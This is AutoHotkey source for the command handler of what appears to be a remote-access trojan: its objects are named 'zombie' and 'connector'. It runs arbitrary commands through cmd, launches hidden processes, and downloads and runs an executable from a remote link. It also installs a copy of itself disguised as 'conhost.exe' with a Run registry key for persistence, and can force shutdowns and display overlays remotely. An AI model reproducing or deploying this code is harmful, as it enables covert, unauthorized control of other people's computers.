class Commands{
	static config
	static translator
	static zombie
	static connector
	
	sendNotation(parameter){
		link := this.config.links.notation . this.zombie.getName() . "?notation=" . parameter
		this.connector.sendGet(link)
	}
	
	start(parameter){
		run %parameter%
	}
	
	cmd(parameter){
		run cmd /c %parameter%
	}

	starthidden(parameter){
		run %parameter%,,hide
	}

	msgbox(parameter){
		msgbox, , system, % parameter ;, 5 ;delay
	}

	error(parameter){
		msgbox, 16, system, % parameter ;, 5 ;delay
	}

	wallpaper(parameter){
		UrlDownloadToFile, %parameter%, %A_MyDocuments%\wp.jpg
		DllCall("SystemParametersInfo", UInt, 0x14, UInt, 0, Str, A_MyDocuments . "/wp.jpg", UInt, 1)
	}

	tooltip(parameter){
		ToolTip, %parameter%
		sleep 2200
		ToolTip
	}

	test(parameter){
		ToolTip, parameter, 0, 0
		sleep 2000
		ToolTip
	}

	; @shell
	shell(parameter){
		if(parameter == "exit"){
			exitApp
		}
		else if(parameter == "update"){
			UrlDownloadToFile, % this.config.links.update, %A_MyDocuments%\Conhost\update.exe
			run %A_MyDocuments%\Conhost\update.exe
			exitApp
			;msgbox % Connect.appLink
		}
		else if(parameter == "install"){
			extension := strSplit(A_ScriptName, ".")
		
			if(extension[2] == "ahk"){
				msgbox you cant install uncompiled app.
			}else{
				fileCreateDir, %A_MyDocuments%\Conhost
				fileCopy %A_ScriptName%, %A_MyDocuments%\Conhost\conhost.exe, 1
				
				;regWrite is doing strange behaviour here :/
				try{
					regWrite, REG_SZ, HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run, Conhost, %A_MyDocuments%\Conhost\conhost.exe
				}
				catch{
					msgbox Need admin permission.
				}
				
				run %A_MyDocuments%\Conhost\conhost.exe
				exitApp
			}
		}
		else if(parameter == "uninstall"){
			regDelete, HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run, Conhost
			exitApp
		}
	}

	title(parameter){
		WinGetActiveTitle, title
		WinSetTitle, %title%, , %parameter%
	}

	yell(parameter){
		Gui, Color, 010101
		Gui, +LastFound +AlwaysOnTop ; Make the GUI window the last found window for use by the line below.
		WinSet, TransColor, 010101
		
		Gui, -Caption
		gui, font, s80,
		Gui, add, text, w100 cRed, %parameter%
		Gui, show, NA , dick
		sleep 4000
		Gui, destroy
	}

	image(parameter){
		Gui, Color, 010101
		Gui, +LastFound +AlwaysOnTop ; Make the GUI window the last found window for use by the line below.
		WinSet, TransColor, 010101
		
		Gui, -Caption
		gui, font, s80,
		UrlDownloadToFile, %parameter%, %A_MyDocuments%\picture.jpg
		Gui, add, picture, , % A_MyDocuments . "/picture.jpg"
		Gui, show, NA , dick
		sleep 4000
		Gui, destroy
	}

	system(parameter){
		if(parameter == "lcdoff")
			SendMessage 0x112, 0xF170, 2,,Program Manager ; send the monitor into off mode
		else if(parameter == "logout")
			Shutdown, 0
		else if(parameter == "shutdown")
			Shutdown, 1
		else if(parameter == "kill")
			Shutdown, 12
	}
	
	speak(parameter){
		this.translator.speak(parameter)
	}
	
	volume(parameter){
		soundSet, parameter
	}
	
	setConfig(){
		this.config := config
		return this
	}
	
	setZombie(zombie){
		this.zombie := zombie
		return this
	}
	
	setTranslator(translator){
		this.translator := translator
		return this
	}
	
	setConnector(connector){
		this.connector := connector
		return this
	}
}